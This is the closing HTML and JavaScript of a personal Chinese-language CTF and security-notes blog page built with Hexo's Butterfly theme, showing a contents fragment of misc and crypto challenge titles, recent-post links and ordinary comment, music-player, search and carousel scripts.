href="#%E5%93%A6%E3%80%90%E8%A7%A3%E5%88%B0%E5%9B%BE%E7%89%87%E3%80%91"><span class="toc-text">哦【解到图片】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%A1%E5%9D%8F%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-text">没坏的压缩包</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Four-Ways-to-the-Truth"><span class="toc-text">Four Ways to the Truth</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Half-a-Key"><span class="toc-text">Half a Key</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/f630573e/" title="【笔记】pwn"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="【笔记】pwn"/></a><div class="content"><a class="title" href="/posts/f630573e/" title="【笔记】pwn">【笔记】pwn</a><time datetime="2026-01-13T12:30:54.000Z" title="发表于 2026-01-13 20:30:54">2026-01-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/90f90e31/" title="【比赛】2026-furryCTF"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%912026-furryCTF_image.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="【比赛】2026-furryCTF"/></a><div class="content"><a class="title" href="/posts/90f90e31/" title="【比赛】2026-furryCTF">【比赛】2026-furryCTF</a><time datetime="2026-01-13T03:26:32.000Z" title="发表于 2026-01-13 11:26:32">2026-01-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/c1e92d18/" title="【软件】cyberchef"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="【软件】cyberchef"/></a><div class="content"><a class="title" href="/posts/c1e92d18/" title="【软件】cyberchef">【软件】cyberchef</a><time datetime="2026-01-12T23:52:57.000Z" title="发表于 2026-01-13 07:52:57">2026-01-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/da83febb/" title="【笔记】安卓逆向-Java"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="【笔记】安卓逆向-Java"/></a><div class="content"><a class="title" href="/posts/da83febb/" title="【笔记】安卓逆向-Java">【笔记】安卓逆向-Java</a><time datetime="2026-01-08T23:29:45.000Z" title="发表于 2026-01-09 07:29:45">2026-01-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d24e3614/" title="【笔记】流量学习"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="【笔记】流量学习"/></a><div class="content"><a class="title" href="/posts/d24e3614/" title="【笔记】流量学习">【笔记】流量学习</a><time datetime="2026-01-07T04:33:24.000Z" title="发表于 2026-01-07 12:33:24">2026-01-07</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By luoyinhui</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.0"></script><script src="/js/main.js?v=5.5.0"></script><script src="/pluginsSrc/medium-zoom/dist/medium-zoom.min.js?v=1.1.0"></script><script src="/pluginsSrc/vanilla-lazyload/dist/lazyload.iife.min.js?v=19.1.3"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikoo-vercel01.vercel.app',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const init = (el = document, path = location.pathname) => {
    twikoo.init({
      el: el.querySelector('#twikoo-wrap'),
      envId: 'https://twikoo-vercel01.vercel.app',
      region: '',
      onCommentLoaded: () => {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      },
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    

    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
      if (el.children.length) {
        el.innerHTML = ''
        el.classList.add('no-comment')
      }
    })
  }

  const loadTwikoo = (el, path) => {
    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
    else btf.getScript('/pluginsSrc/twikoo/dist/twikoo.all.min.js?v=1.6.44').then(() => init(el, path))
  }

  if (isShuoshuo) {
    'Twikoo' === 'Twikoo'
      ? window.shuoshuoComment = { loadComment: loadTwikoo }
      : window.loadOtherComment = loadTwikoo
    return
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script></div><script id="click-heart" src="/pluginsSrc/butterfly-extsrc/dist/click-heart.min.js?v=1.1.6" async="async" mobile="false"></script><link rel="stylesheet" href="/pluginsSrc/aplayer/dist/APlayer.min.css?v=1.10.1" media="print" onload="this.media='all'"><script src="/pluginsSrc/aplayer/dist/APlayer.min.js?v=1.10.1"></script><script src="/pluginsSrc/butterfly-extsrc/metingjs/dist/Meting.min.js?v=1.1.6"></script><div class="aplayer no-destroy" id="global-aplayer"></div><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script>(function(){
  if (window.__globalAPlayer__) return;
  function init(){
    var el=document.getElementById('global-aplayer');
    if (!el || !window.APlayer) { setTimeout(init, 100); return; }
    window.__globalAPlayer__ = new APlayer({
      container: el,
      fixed: true,
      autoplay: false,
      preload: 'none',
      storageName: 'aplayer-setting-global',
      lrcType: 0,
      audio: [{
        name: '簇拥烈日的花 - 迟里乌布',
        artist: 'Unknown',
        url: '/audio/flower.flac',
        cover: '/img/music-cover.png',
        type: 'auto'
      }]
    });
    try { window.__globalAPlayer__.audio && (window.__globalAPlayer__.audio.playbackRate = 1) } catch(e){}
  }
  init();
})()</script><script src="/pluginsSrc/pjax/pjax.min.js?v=0.2.8"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => {
      try {
        fn()
      } catch (err) {
        console.debug('Pjax callback failed:', err)
      }
    })
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      const usePjax = true
      false
        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
        : window.location.href = e.request.responseURL
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-switch"><span class="search-switch-item active" data-type="local">本地搜索</span><span class="search-switch-item" data-type="algolia">Algolia</span></div><div id="local-search-panel"><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"></div><hr><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="algolia-search-panel" style="display:none"><div id="algolia-search-input"><div class="ais-SearchBox"><form class="ais-SearchBox-form" action="" role="search" novalidate=""><input class="ais-SearchBox-input" type="search" placeholder="搜索文章" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" maxlength="512" aria-label="Search"><button class="ais-SearchBox-submit" type="submit" title="Submit the search query" style="display:none;"><svg class="ais-SearchBox-submitIcon" width="10" height="10" viewBox="0 0 40 40" aria-hidden="true"><path d="M26.804 29.01c-2.832 2.34-6.465 3.746-10.426 3.746C7.333 32.756 0 25.424 0 16.378 0 7.333 7.333 0 16.378 0c9.046 0 16.378 7.333 16.378 16.378 0 3.96-1.406 7.594-3.746 10.426l10.534 10.534c.607.607.61 1.59-.004 2.202-.61.61-1.597.61-2.202.004L26.804 29.01zm-10.426.627c7.323 0 13.26-5.936 13.26-13.26 0-7.32-5.937-13.257-13.26-13.257C9.056 3.12 3.12 9.056 3.12 16.378c0 7.323 5.936 13.26 13.258 13.26z"></path></svg></button></form></div></div><hr><div id="algolia-search-results"><div id="algolia-hits"><div id="algolia-hits-empty" style="display:none;"></div><div class="ais-Hits" style="display:none;"><ol class="ais-Hits-list"></ol></div></div></div><div class="ais-Pagination" id="algolia-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="algolia-info"><span class="ais-Stats-text"></span><span class="algolia-poweredBy-text">Search powered by Algolia</span></div></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.0"></script><script src="/pluginsSrc/algoliasearch/dist/lite/builds/browser.umd.js?v=5.37.0"></script><script src="/js/search/algolia.js?v=5.5.0"></script></div><!-- hexo injector body_end start --><script>window.toggleHistory = function(btn) {
  var history = document.getElementById('updates-history');
  if (history.style.display === 'none') {
    history.style.display = 'block';
    btn.innerText = '收起';
  } else {
    history.style.display = 'none';
    btn.innerText = '显示更多';
  }
}
</script><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/35b57171/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../assets/preview.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-12-30</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/35b57171/&quot;);" href="javascript:void(0);" alt="">【项目】hexo-butterfly-updates-heatmap插件介绍</a><div class="blog-slider__text">参考语雀热力图制作的hexo热力图插件~~（嘶后面发现和github热力图也很像）</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/35b57171/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/ef1d4e7/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-10-01</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/ef1d4e7/&quot;);" href="javascript:void(0);" alt="">【笔记】markdown-github+vscode使用文档</a><div class="blog-slider__text">markdown语法在基于github+vscode背景下的使用与探索笔记</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/ef1d4e7/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/989aec00/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-12-31</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/989aec00/&quot;);" href="javascript:void(0);" alt="">【刷题】青少年靶场练习</a><div class="blog-slider__text">初步接触应急响应题目，跟随强帝步伐嘻嘻~~</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/989aec00/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/c3315bb0/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-08-16</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/c3315bb0/&quot;);" href="javascript:void(0);" alt="">【笔记】十六进制文件头尾特征</a><div class="blog-slider__text">重要的misc知识点！！！</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/c3315bb0/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/f2309c58/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-11-28</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/f2309c58/&quot;);" href="javascript:void(0);" alt="">任务清单</a><div class="blog-slider__text">什么？！我还有那么多活没干呀，快干！！！</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/f2309c58/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/eb9d2e41/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-02</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/eb9d2e41/&quot;);" href="javascript:void(0);" alt="">阶段小结</a><div class="blog-slider__text">乱七八糟没有逻辑的反思，要是不小心折磨了你的眼睛非常抱歉ㅍ_ㅍ</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/eb9d2e41/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
    console.log('已挂载butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = '/links/,/link/'.split(',');
  var cpage = location.pathname;
  var epage = '/';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><!-- hexo injector body_end end --></body></html>